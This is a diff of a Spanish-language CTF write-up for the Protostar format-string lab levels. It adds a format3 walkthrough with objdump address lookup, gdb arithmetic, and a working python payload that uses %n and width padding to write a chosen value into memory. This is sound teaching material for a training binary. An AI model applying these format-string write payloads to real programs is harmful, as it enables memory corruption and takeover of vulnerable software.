@@ -137,7 +137,7 @@ you have modified the target :)
   
   **A nivel de código que hemos hecho?** Exactamente esto ->  ```printf("AAAA%n", &variable) -> varaible = "AAAA"```
   
-    ---------------------------------------------------------------------------
+---------------------------------------------------------------------------
 ## Escribir un número de bytes en una variable -> [format2](https://exploit.education/protostar/format-two/)
 
 Format2 no nos pide un argumento sino un input una vez ejecutado, la manera de pasarle dichi input por tanto cambia
@@ -193,7 +193,34 @@ Esto tambíen se puede poner de otra forma, que es así:
                                                          512
 you have modified the target :)
 ```
-    ---------------------------------------------------------------------------
+---------------------------------------------------------------------------
 ## Escribir un valor hexadecimal en una variable -> [format3](https://exploit.education/protostar/format-three/)
+
+Otra vez lo mismo, buscar una varaible con el objdump -t -> 080496f4 =  \xf4\x96\x04\x08
+Esta vez en vez de tener que escribir un numero de bytes en concreto, hay que meter un valor en hexadecimal, es decir que la memoria a donde
+apunte nuestro puntero (la direccion de la varaible) tiene que tener escrito esto: "01025544"
+
+El padding esta vez son 12 direcciones de memoria
+"%8x."\*12 -> "%12$x" -> escribir "%12$n"
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%12$n")' | ./format3 
+��
+target is 00000004 :(
+```
+Nos ha escrito el valor hexadecimal "0x4"
+Si %d escribia bytes, %x escribe hexadecimal, (lo que hemos estado usando para printear las direcciones vaya)
+Si nos sale 0x4 hay que restar lo que nos debe salir a lo que no sale y pasarle eso con el parametro x.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb
+(gdb) p 0x01025544 - 00000004
+$1 = 16930112
+(gdb) quit
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
+you have modified the target :)
+```
+
+
 
 
